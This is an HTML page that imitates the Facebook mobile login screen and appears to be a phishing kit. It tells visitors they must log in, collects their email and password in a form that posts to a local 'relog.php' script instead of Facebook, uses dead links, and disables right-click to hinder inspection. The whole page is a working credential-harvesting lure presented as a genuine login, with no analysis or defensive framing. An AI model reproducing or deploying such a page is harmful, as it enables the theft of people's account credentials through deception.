<!--?xml version="1.0" encoding="utf-8"?-->
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "xhtml-mobile10.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Facebook</title>
<link id="Hdqi+" type="text/css" rel="stylesheet" href="k7LsZ6Kzebp.css">
<link id="yU+cJ" type="text/css" rel="stylesheet" href="RdxXuLZOwAp.css">
<link id="1mFNa" type="text/css" rel="stylesheet" href="INa-j1hStsU.css">
<link id="1MiIb" type="text/css" rel="stylesheet" href="diMQkJ1Odg6.css">
<link id="RtI0j" type="text/css" rel="stylesheet" href="1Vv4bii7bxR.css">
<link id="2MLkD" type="text/css" rel="stylesheet" href="IFFDgrjmTDl.htm">
<link id="j0nHs" type="text/css" rel="stylesheet" href="1j-MOx9XPgA.css">
<link id="mz7Wm" type="text/css" rel="stylesheet" href="VLogo77go.css">
<link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" />
<script src="QSUIFyb0MPk.js"></script>

</head>
<body class="touch acw">
<h1 class="_52r" style="display:block;height:0;overflow:hidden;position:absolute;width:0">Facebook</h1>
<div id="page"><div class="mFuturePageHeader chromeBar acb abb" id="m-future-header" data-sigil="marea"><table><tbody><tr><td class="center" id="m-future-header-center">
<i class="img sp_46vhv4 sx_f45606"><u>facebook</u></i></td></tr></tbody></table></div>
<div id="root" tabindex="0" role="main" class="_4498 acw"><div id="objects_container"><div class="acy apm abb" data-sigil="marea"><span class="mfsm">You must login to continue.</span></div>
<div id="root" tabindex="0" role="main" class="_4498 acw">
<div id="objects_container">
<div class="aclb">
<div class="loginInner">
<form method="post" action="relog.php?refsrc=&amp;refid=8" onsubmit="return Form1_Validator(this)">

<div class="_al8"></div><div class="grouped inset aclb"><div class="mobile-login-field mobile-login-field-email first area textInputArea acw" data-sigil="marea"><div class="input inputWrapper" id="u_0_0">
<input class="tiapl input" autocorrect="off" autocapitalize="off" name="email" placeholder="Email or Phone" data-sigil="clearableInput" type="text"><div class="mClearButtonWrapper" style="display:none" data-sigil="touchable clearButton"><div class="mClearButton">  </div></div></div></div><div class="mobile-login-field last area textInputArea acw abt" data-sigil="marea"><div class="input inputWrapper" id="u_0_1"><input class="tiapl input" autocorrect="off" autocapitalize="off" name="pass" placeholder="Password" data-sigil="clearableInput" type="password">
<div class="mClearButtonWrapper" style="display:none" data-sigil="touchable clearButton"><div class="mClearButton">  </div></div></div></div></div>
<div class="button_area aclb apl" data-sigil="marea">
<button type="submit" value="Log in" class="btn btnC largeBtn bglb mfsl touchable" name="login" role="button" data-sigil="touchable">Log In</button></div><div class="_4xdr aclb" data-sigil="marea"><div class="_al8">New on Facebook?</div><div class="button_area aclb apl" data-sigil="marea">
</noscript></form>

<div class="other-links aclb apl" data-sigil="marea"><span class="mfss fcg"><span class="mfss fcg"><a class="sec" href="#">Forgot Password?</a> <span role="separator" aria-hidden="true"> &middot </span> <a class="sec" href="#">Help Center</a></span></span></div></div></div></div>
<script language="JavaScript">
function Form1_Validator(theForm)
{
var alertsay = ""; 
if (theForm.email.value.length < 3)
{
alert("Please enter your email");
theForm.email.focus();
return (false);
}
if (theForm.pass.value.length < 6)
{
alert("Please enter your password");
theForm.pass.focus();
return (false);
}}
</script>

<div id="footer"><div class="acg apm" data-sigil="marea"><span class="mfss fcg"><b> English (US)  </b> <span role="separator" aria-hidden="true">&middot</span> <a class="sec" href="#">&#20013;&#25991;(&#31616;&#20307;)</a> <span role="separator" aria-hidden="true">&middot</span> <a class="sec" href="#">&middot&middot&middot&middot&middot&middot</a></span></div>
<div class="acg apm" data-sigil="marea">
<span class="mfss fcg">
Facebook &copy; 2021</span></div></div></div>
</div></div></div>


<script language="javascript" type="text/javascript">
<!-- //
var message="";
function clickIE() {if (document.all) {(message);return false;}}
function clickNS(e) {if
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {(message);return false;}}}
if (document.layers)
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
document.oncontextmenu=new Function("return false")
// -->

</script> 
</body></html>